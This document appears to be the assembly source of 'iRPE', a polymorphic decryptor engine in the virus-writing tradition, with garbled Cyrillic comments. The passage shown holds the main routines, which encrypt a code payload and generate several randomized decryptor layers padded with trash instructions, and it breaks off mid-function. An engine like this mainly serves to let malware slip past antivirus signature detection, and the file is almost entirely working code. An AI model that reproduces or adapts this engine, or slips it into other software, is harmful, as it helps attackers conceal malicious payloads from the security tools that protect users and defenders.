;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                                                                                           			 ;
;                                                                                                 		 ;
;                                                                                                    	 ;
;                          xxxxxxxxxxxxx     xxxxxxxxxxxxx     xxxxxxxxxxxxxxx                           ;
;                          xxxxxxxxxxxxxx    xxxxxxxxxxxxxx    xxxxxxxxxxxxxxx                           ;
;                          xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx                           ;
;                          xxxxx     xxxxx   xxxxx     xxxxx   xxxxx                                     ;
;                  xxxxx   xxxxx     xxxxx   xxxxx     xxxxx   xxxxx                                     ;
;                  xxxxx   xxxxx     xxxxx   xxxxx     xxxxx   xxxxx                                     ;
;                  xxxxx   xxxxxxxxxxxxxxx   xxxxxxxxxxxxxxx   xxxxxxxxxxxxx                             ;
;                  xxxxx   xxxxxxxxxxxxxx    xxxxxxxxxxxxxx    xxxxxxxxxxxxx                             ;
;                  xxxxx   xxxxxxxxxxxxx     xxxxxxxxxxxxx     xxxxxxxxxxxxx                             ;
;                  xxxxx   xxxxx    xxxxx    xxxxx             xxxxx                                     ;
;                  xxxxx   xxxxx     xxxxx   xxxxx             xxxxx                                     ;
;                          xxxxx     xxxxx   xxxxx             xxxxx                                     ;
;                  xxxxx   xxxxx     xxxxx   xxxxx             xxxxxxxxxxxxxxx                           ;
;                  xxxxx   xxxxx     xxxxx   xxxxx             xxxxxxxxxxxxxxx                           ;
;                  xxxxx   xxxxx     xxxxx   xxxxx             xxxxxxxxxxxxxxx                           ;
;																										 ;
;																										 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;									It's Real Polymorph Engine											 ;
;											 iRPE														 ;
;											irpe.asm													 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											  =)!													 	 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											 iRPE														 ;
;								������ ��������� �����⥫� iRPE										 ;
;																										 ;
;���� (stdcall: DWORD iRPE(DWORD xparam)):																 ;
;	xparam				-	���� �������� IRPE_POLYMORPH_GEN											 ; 
;--------------------------------------------------------------------------------------------------------;
;�����:																									 ;
;	(+)					-	ᣥ���஢���� ��������� ���ਯ��(�) � ����஢���� �����				 ; 
;	(+)					-	���������� ��室�� ���� �������� IRPE_POLYMORPH_GEN						 ;
;	EAX					-	���� (� ����) ᣥ���஢������ ���ਯ�� (+ ��஢������ ����)			 ; 
;--------------------------------------------------------------------------------------------------------;
;�������:																								 ;
;	(+)					-	�室�� ���� �������� IRPE_POLYMORPH_GEN ��᫥ ��ࠡ�⪨ ������ ������� 	 ;
;							⥬� ��, �� � ��। �맮��� - �� ��������; 								 ;
;	(+)					-	�᫨ �������� ���� ����������, � ������ �� ࠧ��� ���� 4;				 ;
;	(+)					-	����� ���� �㦥� ��� �����樨 �������䭮�� ���ਯ��, � ⠪�� ��� 		 ;
;							��஢���� �����ண� ����(������) ��� ��᫥���饩 ��� ����஢��. ����� 	 ;
;							�ਬ������� ���	ᠬ����⥫�� ������ (���� �᫮���), ⠪ �, ���ਬ��, 	 ;
;							����� � ���裥��� ��� ����஥��� ࠧ��筮�� ���� (堮�, ॠ����筮�� � 	 ;
;							�.�., ������/�ࢨ/����), �ணࠬ� (������ ��shit'�) etc; 				 ;
;	(+)					-	���� ��⮨� �᫮��� �� 2-� 䠩���: xtg.inc & irpe.asm. ���� 䠩� - 		 ;
;							��������筨�. � �� ������� �� ����室��� �������� etc, � �� ��⪨� 	 ;
;							���ᠭ��. 2 䠩� - ᠬ� ॠ������ ������ iRPE. 			 				 ;
;							����� �� �����⠬ �㤥� ��⠫쭠� ������ ��� ����� ��� �㦭�� �������	 ; 
;	(+)					-	� ������� ���� ����, ���筮�� ����� ����-���� �������;					 ;
;	(+)					-	����� ��-� ��� xD;														 ; 
;--------------------------------------------------------------------------------------------------------; 
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;										������ ���ਯ��												 ;
;																										 ;
;																										 ;
;		mov		eax, 00405000h																			 ;
;		mov		ecx, 5DEB9A17h																			 ;
;		xor		dword ptr [eax], ecx  <-+																 ;
;		inc		ecx                     |																 ;
;		dec		eax                     |																 ;
;		cmp		eax, 401000h            |																 ;
;		jae		------------------------+																 ;
;		mov		edx, 401000h																			 ;
;		call	edx																						 ;
;																										 ;
;																										 ;
;[!]:	�������, �� �ᯮ������� � �맮��, ॣ����� � �.�. - ��� �� �������;							 ; 
;[+]:	������ �� ��� ������ - �� ���� ���ਯ��. ���ਬ��, ��ࢠ� ������� ���ਯ�� ����� ���� 	 ;
;		⠪��:																							 ;
;			push	75h																					 ;
;			pop		eax																					 ;
;			add		eax, 00404F8Bh		;75h + 404F8Bh = 405000h;										 ;
;		����� (� ������ �ਬ��) ��� ���樠����樨 ॣ�1 �㤥� 㦥 2 ����� ���ਯ��:					 ;
;			1-� ����: push/pop																			 ;
;			2-�� ����: add																				 ; 
;etc; 																									 ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;v1.0

	

																		;m1x
																		;pr0mix@mail.ru
																		;EOF 






 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪a iRPE
;�� � ���� ��� ����� (������ �㭪�);
;���� (stdcall IRPE(DWORD xparam)):
;	xparam					-	���� �������� IRPE_POLYMORPH_GEN
;�����:
;	(+)						-	ᣥ���஢���� ���ਯ�� � ����஢���� �����
;	(+)						-	���������� ��室�� ���� �������� IRPE_POLYMORPH_GEN
;	EAX						-	���� ᮧ������� ���ਯ�� (� ��஢���� �����); 
;	(!) 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
irpe_struct1_addr			equ		dword ptr [ebp + 24h]				;addr of IRPE_POLYMORPH_GEN

irpe_save_buffer_addr		equ		dword ptr [ebp - 04]				;��࠭�� ���� �ᯮ����⥫쭮�� ���� (�뤥����), � ���஬ �㤥� ������� ���ਯ��(�) � ��࠭��� ��஢���� ���(�); 

iRPE:
	pushad																;���堫�!
	mov		ebp, esp
	sub		esp, 08
	cld
	xor		edx, edx
	mov		ebx, irpe_struct1_addr
	assume	ebx: ptr IRPE_POLYMORPH_GEN
	mov		esi, [ebx].xtg_struct_addr
	assume	esi: ptr XTG_TRASH_GEN

	cmp		[ebx].decryptor_size, DECRYPTOR_MIN_SIZE					;�᫨ ��।���� ࠧ��� ����� �������쭮��, � ��室�� 
	jl		_irpe_ret_

	push	IRPE_ALLOC_BUFFER
	call	[esi].alloc_addr											;�뤥�塞 ���� ��� �����樨 ���ਯ��(��)
	mov		irpe_save_buffer_addr, eax									;��࠭�� ����祭�� ���� (��� 0) � ������ ��६�����

	test	eax, eax													;�᫨ �뤥���� ���� �� ����稫���, ⮣�� �� ��室!
	je		_irpe_ret_
	xchg	eax, edx													;����, ��࠭�� ���� �뤥������ ⮫쪮 �� ����� � ॣ� EDX;

;--------------------------------------------------------------------------------------------------------

	push	(DECRYPTOR_MAX_NUM - 01)									;�� ���⨤��ਯ�୮��, ������ ⠪, �⮡� ��易⥫쭮 ᣥ���஢����� ��� �� 2 ���ਯ��: 1 ���⮩ + 1 䨭���� ���ਯ��; (���⮬� DECRYPTOR_MAX_NUM ������ ���� >= 2); 
	call	[esi].rang_addr

	lea		ecx, dword ptr [eax + 01]									;� ECX - �᫮ - ᪮�쪮 (������) ���ਯ�஢ �����஢���; 

	;mov		ecx, 04													;for test; 

	push	[esi].tw_trash_addr											;��࠭�� � �⥪� ����� ����, ⠪ ��� ᥩ�� �� �㤥� ��������
	push	[esi].trash_size
	push	[esi].icb_struct_addr
	push	[ebx].code_addr
	push	[ebx].va_code_addr
	push	[ebx].code_size 

	mov		eax, [ebx].decryptor_size
	mov		[esi].trash_size, eax										;⥯��� ���� trash_size = ࠧ���� ������ ���ਯ��; 

	test	[ebx].xmask, IRPE_MULTIPLE_DECRYPTOR						;����� �� ������ ���⨤��ਯ�୮���?
	je		_irpe_final_decryptor_ 										;�᫨ ���, ⮣�� �ࠧ� ���室�� �� ������� 䨭��쭮�� � �����⢥����� ���ਯ��;

	push	[esi].fmode													;����, ⠪�� ��࠭�� ���祭�� � ��� �����;
	push	[esi].xmask1
	push	[esi].xmask2
	push	[ebx].xmask

	and		[ebx].xmask, 0												;���뢠�� ���� (㪠�뢠��, �� ��� �� �㦭� � ��� ���ਯ��� �����஢��� �맮� (call) �� ����஢���� ���);
	
	imul	eax, ecx													;��� �誠 ⠪��: �� �� �� � ���ਯ�� �������樨 � �����-����⮬. ���⮬� ��� �㦥� VA, 㪠�뢠�騩 �� ��஢����/����஢���� ���;
																		;�᫨ �� �� ���⨤��ਯ�୮���, � �� ���ਯ��� � ��� ���� ������ � ⮣� �� ࠧ��� - �� �����. 
																		;� ����� �� ����� ������� ��� ��� ���ਯ�஢ �ࠢ���� VA, ��⠫������� �� ���� va_code_addr (�᫨, ���ਬ��, ��� �㦭� ������� VA ��� 3-��� ���ਯ��, � � ���� va_code_addr �� �ਡ���� ࠧ��� ���ਯ�� (trash_size) 3 ࠧ�, ⠪-� �!); 
	add		[ebx].va_code_addr, eax										;� ���, ᮡ�⢥��� ������, ᠬ� ᫮�����;

	mov		[esi].fmode, XTG_MASK										;㪠�뢠�� ०�� �����樨 XTG_MASK (�⮡� �筮 ᣥ���஢����� �� ��।���� ����� - �� ����� ��� ⮣�, �⮡� ���ਯ��� �뫨 �筮 ������ � ⮣� �� ࠧ���);
	mov		[esi].xmask1, XTG_ON_XMASK									;� 㪠�뢠��, �� ����� ������� ��� �������;
	mov		[esi].xmask2, XTG_ON_XMASK									; 

;--------------------------------------------------------------------------------------------------------

_irpe_multi_decryptor_:													;������� ������ ���ਯ�஢;
	mov		[esi].tw_trash_addr, edx									;㪠�뢠��, ��� ������� ������㥬� ���ਯ�� � ��᫥���騬 �� ��� ��஢���� �����;

	push	ebx															;IRPE_POLYMORPH_GEN
	call	generate_decryptor											;������㥬 ���ਯ�� � �����뢠�� �ࠧ� ��᫥ ���� ����஢���� ���/�����; 

	test	eax, eax													;�᫨ ᣥ����� �� ����稫���, ⮣�� ��室��
	je		_irpe_bs_1_ 

	mov		edx, eax													;����, edx - ⥯��� �࠭�� ����, ����� ��室���� �ࠧ� �� ��஢���� �����
	sub		eax, [esi].tw_trash_addr									;eax = ࠧ���� ���ਯ�� + ��஢���� ���;
	mov		[ebx].code_size, eax
	mov		eax, [esi].tw_trash_addr
	mov		[ebx].code_addr, eax										;code_addr = tw_trash_addr -> � ���� �� 㪠�뢠��, �� ⥯��� ��஢���� ��� - �� ��� ᮧ����� ���ਯ�� � �ਣ������ ��஢���� �����!
	mov		eax, [esi].trash_size
	sub		[ebx].va_code_addr, eax										;�� � ���४��㥬 va_code_addr (�⠩ ����!); 

	dec		ecx															;���室�� � �����樨 ��।���� ���ਯ��;
	jne		_irpe_multi_decryptor_

;--------------------------------------------------------------------------------------------------------

_irpe_bs_1_:
	pop		[ebx].xmask													;����⠭�������� ����� ����, ⠪ ��� ᥩ�� �㤥� �����஢��� 䨭����, ����⢥��� ���ਯ��; �� �� �㤥� ��뢠���� ᠬ� ���� ��� ��᫥���饩 ����஢�� ��㣨� ���ਯ�஢ � �.�.; 
	pop		[esi].xmask2												;�.�. ���⮢� ���ਯ��;
	pop		[esi].xmask1
	pop		[esi].fmode

	test	eax, eax													;�᫨ eax = 0, ����� ��-� ࠭�� �� ����稫��� ᣥ���஢���, ��� �� ��室;
	je		_irpe_free_1_

_irpe_final_decryptor_:													;������� 䨭��쭮�� ���ਯ��;
	mov		[esi].tw_trash_addr, edx

	push	ebx
	call	generate_decryptor											;ᮧ���

	test	eax, eax													;�᫨ �� ����稫���, � �� ��室
	je		_irpe_free_1_
	
;--------------------------------------------------------------------------------------------------------

	mov		edi, [esi].nobw												;����, edi = ��� ॠ�쭮 ����ᠭ��� ���⮢ (�� ���� �� ����� ������ ���������);
	mov		ecx, edi
	add		ecx, [ebx].code_size										;ecx = ࠧ��� 䨭��쭮�� ���ਯ�� + ࠧ��� ��஢������ ����;

	push	ecx															;�뤥�塞 ��� ��� ������
	call	[esi].alloc_addr

	test	eax, eax													;����稫���?
	je		_irpe_free_1_												;�᫨ ���, � �� ��室
	
	mov		edx, [esi].tw_trash_addr									;���� �த������; ��࠭塞 � EDX ���� 䨭��쭮�� ���ਯ��
	mov		[ebx].decryptor_addr, eax									;� ��࠭塞 �� ���祭�� � ᮮ⢥�����饬 ����
	mov		[esi].fnw_addr, eax
	add		[esi].fnw_addr, edi											;fnw_addr - 㪠�뢠�� �� ����� 䨭��쭮�� ���ਯ�� (� ���� �� ��砫� ��஢������ ����);
	sub		[esi].ep_trash_addr, edx									;���४��㥬 ��� �室� � ���ਯ�� � ���⮬ ���� ������ ����;
	add		[esi].ep_trash_addr, eax
	mov		edi, [esi].ep_trash_addr
	mov		[ebx].ep_polymorph_addr, edi								;��࠭塞;
	mov		edi, [esi].fnw_addr
	mov		[ebx].encrypt_code_addr, edi								;etc; 
	mov		[ebx].total_size, ecx										;��࠭塞 ��騩 ࠧ��� 䨭��쭮�� ���ਯ�� + ࠧ��� ��஢������ ���� � ������ ����; 
	mov		edi, eax
	push	esi
	mov		esi, edx
	rep		movsb														;�����뢠�� � ���� ���� 䨭���� ���ਯ�� � ��஢���� �����;
	pop		esi
	
	xchg	eax, edx													;edx = ���� ������ ���� ��� ���� 䨭��쭮�� ���ਯ��; 
	jmp		_irpe_free_1_1_												;��룠�� �����;

;--------------------------------------------------------------------------------------------------------

_irpe_free_1_:
	xor		edx, edx													;� ��������, �᫨ ��-� �� ����稫��� ᣥ�����;

_irpe_free_1_1_:
	pop		[ebx].code_size												;����⠭�������� ࠭�� ��࠭�� ����
	pop		[ebx].va_code_addr
	pop		[ebx].code_addr
	pop		[esi].icb_struct_addr
	pop		[esi].trash_size
	pop		[esi].tw_trash_addr

	push	irpe_save_buffer_addr
	call	[esi].free_addr												;�᢮������� ����� ���㦭� ����;
	
;--------------------------------------------------------------------------------------------------------

_irpe_ret_:	
	mov		dword ptr [ebp + 1Ch], edx 									;��࠭塞 � eax ���� 䨭��쭮�� ���ਯ�� (��� 0, �᫨ ��-� �� ����稫���);
	mov		esp, ebp
	popad
	ret		04 															;��室;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪� IRPE 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;�㭪� generate_decryptor
;������� ���ਯ��
;���� (stdcall: generate_decryptor(xparam)):
;	xparam		-	���� IRPE_POLYMORPH_GEN
;�����:
;	EAX			-	���� ��� ���쭥�襩 ����� ����, ��� 0; 
;	(+)			-	ᣥ���஢���� ���ਯ��
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
gend_struct1_addr				equ		dword ptr [ebp + 24h]			;IRPE_POLYMORPH_GEN

gend_save_blocks_addr			equ		dword ptr [ebp - 04]			;��� ��࠭�� ���� ����, � ���஬ �࠭���� �����/�������� ���ਯ��;
gend_tmp_var1					equ		dword ptr [ebp - 08]			;�ᯮ����⥫쭠� ��६�����; 

generate_decryptor:
	pushad
	mov		ebp, esp
	sub		esp, 12
	mov		ebx, gend_struct1_addr
	assume	ebx: ptr IRPE_POLYMORPH_GEN
	mov		esi, [ebx].xtg_struct_addr
	assume	esi: ptr XTG_TRASH_GEN	 
	xor		edi, edi													;edi = 0; 

	push	ebx															;IRPE_POLYMORPH_GEN
	call	generate_block_decryptor									;ᮧ��� ����� ���ਯ��;
	mov		gend_save_blocks_addr, eax									;EAX = ���� ����, � ���஬ �࠭���� �� �����/������ન; 

	test	eax, eax													;�᫨ �� ����稫��� ᣥ�����, ����� ��室��
	je		_gend_ret_

	mov		[esi].icb_struct_addr, eax									;���� ��࠭�� ����� ���� � ������ ����: XTG_TRASH_GEN.icb_struct_addr; �.�. 㪠�뢠��, �� ����� � ���誮��� �㤥� �����뢠�� � ������� ������� (� ������ ���樨 �� ���ਯ��); 
	xchg	eax, edx
	assume	edx: ptr IRPE_CONTROL_BLOCK_STRUCT

;--------------------------------------------------------------------------------------------------------

	push	esi															;XTG_TRASH_GEN
	call	[ebx].xtg_addr												;��뢠�� ���裥� (������� ���ਯ��);

	cmp		[esi].nobw, 0												;�᫨ ॠ�쭮� �᫮ ����ᠭ��� ���⮢ = 0, ����� ������� ���-� �� 㤠������) �� ��室; 
	je		_gend_free_1_

	mov		edi, [edx].func_level										;����, ��࠭�� ����� �㭪樨 (� ���ன �� ����ᠭ ���ਯ��) 
	mov		[ebx].leave_num, edi										;� ������ ���� - �᫨ ����� �㭪樨 = 2, � ����� ����� �맢��� 2 ࠧ� leave ��� ������஢�� �⥪� (�᫨ �� �����); 
	mov		edi, [esi].fnw_addr											;edi = ���� ��� ���쭥�襩 ����� (㪠�뢠�� �� ����� ᣥ���஢������ ���ਯ��); ��䤥� �ࠧ� �� ���ਯ�஬ �����뢠�� ��஢���� ���; 
	
;--------------------------------------------------------------------------------------------------------

	push	esi															;
	mov		esi, [ebx].code_addr										;esi = ���� ��஢������ ����
	mov		ecx, [ebx].code_size										;ecx = ࠧ��� ��஢������ ����
	mov		ebx, [edx].main_key											;ebx = �᭮���� (�� �� ������) ���� ��� ��஢��/����஢��
	mov		eax, [edx].slide_key										;eax = ������騩 ����
	mov		gend_tmp_var1, eax											;��࠭�� ������騩 ���� ⠪�� �� �ᯮ����⥫쭮� ��६�����; 
	imul	eax, ecx													;⠪ ��� �� ���砫� ᮧ���� ���ਯ��, ⥯��� ��� �㦭� ������� ����� ���� ��� ��஢�� ����; 

	test	[edx].chgkey_alg, IRPE_DEC___R32							;ᬮ�ਬ, ����� ������ ��������� �᭮����� ���� ��࠭; 
	jne		_dec_sub_begin_key1_
	test	[edx].chgkey_alg, IRPE_SUB___R32__IMM32
	jne		_dec_sub_begin_key1_
	test	[edx].chgkey_alg, IRPE_SUB___R32__IMM8
	jne		_dec_sub_begin_key1_

_inc_add_begin_key1_:													;�᫨ �᭮���� ���� � ���ਯ�� 㢥��稢�����, � � ��� ��� 㢥��稬, �⮡� ������� ���� ��� ��஢����; 
	add		ebx, eax													
	sub		ebx, gend_tmp_var1
	jmp		_begin_crypt_

_dec_sub_begin_key1_:													;�᫨ �᭮���� ���� � ���ਯ�� 㬥��蠥���, � � ��� ��� 㬥��蠥�, �⮡� ������� ���� ��� ��஢����; 
	sub		ebx, eax
	add		ebx, gend_tmp_var1

_begin_crypt_:	
	lodsd																;����砥� ���� 4 ���� ��� ��஢����

_encrypt_cycle_:														;��஢�� ���� �ந�室�� � ��砫� � �����; � ����஢�� - �������, �� ���� � ��砫� ����; 
	test	[edx].crypt_alg, IRPE_XOR___M32__R32						;;��� ᬮ�ਬ, ����� ������ � ���ਯ�� ��� ����஢�� - � �㤥� ��஢��� �����; 
	jne		_crypt_xor_
	test	[edx].crypt_alg, IRPE_ADD___M32__R32
	jne		_crypt_sub_

_crypt_add_:
	add		eax, ebx
	jmp		_chg_key1_
_crypt_sub_:
	sub		eax, ebx
	jmp		_chg_key1_
_crypt_xor_:
	xor		eax, ebx

_chg_key1_:
	test	[edx].chgkey_alg, IRPE_DEC___R32
	jne		_inc_add_key1_
	test	[edx].chgkey_alg, IRPE_SUB___R32__IMM32
	jne		_inc_add_key1_
	test	[edx].chgkey_alg, IRPE_SUB___R32__IMM8
	jne		_inc_add_key1_

_dec_sub_key1_:															;�᫨ ���� � ���ਯ�� 㢥��稢�����, � �� ��� 㬥��蠥� � �����⬥ ��஢��; 
	sub		ebx, gend_tmp_var1
	jmp		_crypt_code_
_inc_add_key1_:															;�᫨ ���� � ���ਯ�� 㬥��蠥���, � �� ��� 㢥��稢��� � �����⬥ ��஢��;
	add		ebx, gend_tmp_var1

_crypt_code_:
	stosb																;����襬 ����஢���� ����
	lodsb																;����� ᫥���騩 ���� ��� ��஢��
	ror		eax, 08														;ᤥ��� ��� � ���थ ��᫥���� ��� ����� �।� ��⠫��� ⥪��� ���⮢; 
	dec		ecx
	jne		_encrypt_cycle_												;���㥬 ��।��� ����; 

	pop		esi 

;--------------------------------------------------------------------------------------------------------

_gend_free_1_:
	push	gend_save_blocks_addr										;�᢮������� ࠭�� �뤥������ ������ ��� ������ ���ਯ��; 
	call	[esi].free_addr

_gend_ret_:
	mov		dword ptr [ebp + 1Ch], edi									;��࠭塞 ���� ��� ���쭥�襩 ����� � eax; 
	mov		esp, ebp
	popad
	ret		04															;��室��; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪� generate_decryptor
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;�㭪� generate_block_decryptor
;������� ������ ���ਯ��
;���� (stdcall: generate_block_decryptor(xparam)): 
;	xparam		-	���� (�室���) �������� IRPE_POLYMORPH_GEN
;�����:
;	EAX			-	���� �뤥������ ����� (� ���ன ���� ��ࢮ� ������� IRPE_CONTROL_BLOCK_STRUCT, 
;					� �ࠧ� �� ��� ᣥ���஢���� �������� IRPE_BLOCK_DATA_STRUCT); ���� 0; 
;	(+)			-	ᣥ���஢���� ����� (������ન); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
irpe_gbd_struct1_addr 		equ		dword ptr [ebp + 24h]				;addr of IRPE_POLYMORPH_GEN

irpe_gbd_icbs_addr			equ		dword ptr [ebp - 04]				;addr of IRPE_CONTROL_BLOCK_STRUCT
irpe_gbd_regs				equ		dword ptr [ebp - 08]				;save generated regs
irpe_gbd_imm32				equ		dword ptr [ebp - 12]				;save imm32; 
irpe_gbd_dflag				equ		dword ptr [ebp - 16]				;��� �࠭�� �᫮ - �� ���� ������, ����� ������� ���ਯ�� �㤥� �������; 
irpe_gbd_vca				equ		dword ptr [ebp - 20]				;va_code_addr
irpe_gbd_codesize			equ		dword ptr [ebp - 24]				;code_size
irpe_gbd_tmp_var1			equ		dword ptr [ebp - 28]				;tmp var; 

generate_block_decryptor:
	pushad
	mov		ebp, esp
	sub		esp, 32
	mov		ebx, irpe_gbd_struct1_addr
	assume	ebx: ptr IRPE_POLYMORPH_GEN
	push	[ebx].va_code_addr											;��࠭塞 �㦭� ���� �� �ᯮ����⥫��� ��६�����; 
	pop		irpe_gbd_vca
	push	[ebx].code_size
	pop		irpe_gbd_codesize	
	mov		ebx, [ebx].xtg_struct_addr
	assume	ebx: ptr XTG_TRASH_GEN

	push	02
	call	[ebx].rang_addr
	mov		irpe_gbd_dflag, eax											;0 or 1; 

	mov		ecx, (sizeof (IRPE_BLOCK_DATA_STRUCT) * MNBD + sizeof (IRPE_CONTROL_BLOCK_STRUCT) + USEFUL_CODE_MAX_SIZE) 

	push	ecx															;size
	call	[ebx].alloc_addr											;�뤥�塞 ������ ��� ����� ������ ���ਯ��, � ⠪�� ��� �࠭���� ᪥��� ���ਯ��; 
	mov		irpe_gbd_icbs_addr, eax

	test	eax, eax													;�᫨ ���� �뤥���� �� ����稫���, ⮣�� ��室��; 
	je		_gbd_ret_

	push	ecx															;size
	push	eax															;addr
	call	xmemset														;����, ���砫� ���㫨� �뤥������ ������;

	xchg	eax, esi
	lea		ecx, dword ptr [esi + sizeof (IRPE_CONTROL_BLOCK_STRUCT)]
	lea		edi, dword ptr [esi + sizeof (IRPE_BLOCK_DATA_STRUCT) * MNBD + sizeof (IRPE_CONTROL_BLOCK_STRUCT)]
	assume	esi: ptr IRPE_CONTROL_BLOCK_STRUCT
	assume	ecx: ptr IRPE_BLOCK_DATA_STRUCT
	mov		[esi].cur_addr, ecx											;���� ⥪�饣� ����� - ��࠭塞 ���� ᠬ��� ��ࢮ�� �����; 

	call	generate_regs												;������㥬 ॣ����� (3��?) ��� ���ਯ��;
	mov		irpe_gbd_regs, eax											;��࠭塞 ��; 

;--------------------------------------------------------------------------------------------------------

	push	02															;⥯��� ����ਬ ����� ���ਯ��;
	call	[ebx].rang_addr

	test	eax, eax													;
	je		_gbd_block_2_1_

_gbd_block_1_2_:														;�� ����� ���⠬� ����⠢��� ����� 1 � 2, �� �⮬  �ࠢ��쭠� ࠡ��ᯮᮡ����� ���ਯ�� ��࠭����; 
	call	gbd_block_1													;block_init_addr; ����� ���樠����樨: �������� ���⮢� ���� ��� ����஢�� ���� � �᭮��� ���� ��� ����஢�� ����; 
	call	gbd_block_2													;block_init_main_key;
	jmp		_gbd_block_3_

_gbd_block_2_1_:
	call	gbd_block_2													;block_init_main_key
	call	gbd_block_1													;block_init_addr

_gbd_block_3_:
	call	gbd_block_3													;block_crypt; ���� ����஢�� - ������� ����஢�� ����; 

_gbd_block_4_and_5_:	
	push	02															;⠪�� ����� �������� ���⠬� ����� 4 � 5; 
	call	[ebx].rang_addr

	test	eax, eax
	je		_gbd_block_5_4_

_gbd_block_4_5_:
	call	gbd_block_4													;block_chg_main_key; ����� ��������� �᭮����� ���� � ��������� ���� (�� -1) ��� ����஢�� ��।���� ����; 
	call	gbd_block_5													;block_chg_addr
	jmp		_gbd_block_6_

_gbd_block_5_4_:
	call	gbd_block_5													;block_chg_addr
	call	gbd_block_4													;block_chg_main_key; 

_gbd_block_6_:
	call	gbd_block_6													;block_cycle; ���� 横�� - ��� ����ਬ �������� �ࠢ����� ���� � ��᫥���饣� ���室� �� ����஢�� ��।���� ����; 

_gbd_block_7_:
	mov		edx, irpe_gbd_struct1_addr 									;block_call; ���� �맮�� - ����� �஢��塞 �� ��᪥, ����� �� �����஢��� ������� �맮�� (call, 0xE8) �� ����஢���� ���; 
	assume	edx: ptr IRPE_POLYMORPH_GEN
	test	[edx].xmask, IRPE_CALL_DECRYPTED_CODE
	je		_gbd_ret_

	call	gbd_block_7
	
;--------------------------------------------------------------------------------------------------------

_gbd_ret_:
	mov		eax, irpe_gbd_icbs_addr 
	mov		dword ptr [ebp + 1Ch], eax									;eax = ���� �뤥������ ����� ��� ������ ���ਯ�� (��� ���� �������� IRPE_CONTROL_BLOCK_STRUCT); 
	mov		esp, ebp
	popad
	ret		04															;�� ��室, ⮢���! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� �㭪� generate_block_decryptor; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;����� ���� ࠧ���� �ᯮ����⥫�� �㭪� ��� generate_block_decryptor
;����� �㭪� ��������� ����� ��� ���饣� ���ਯ��; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

;=======================[block_1 -> initialization of decryptor (address)]===============================
gbd_block_1:															;ॣ����1 = ����� ���� ��஢������ ���� ��� ��᫥���饩 ��� ����஢��; ����஢�� �ந�室�� � ���� � ��砫�; 
																		;��� �� 
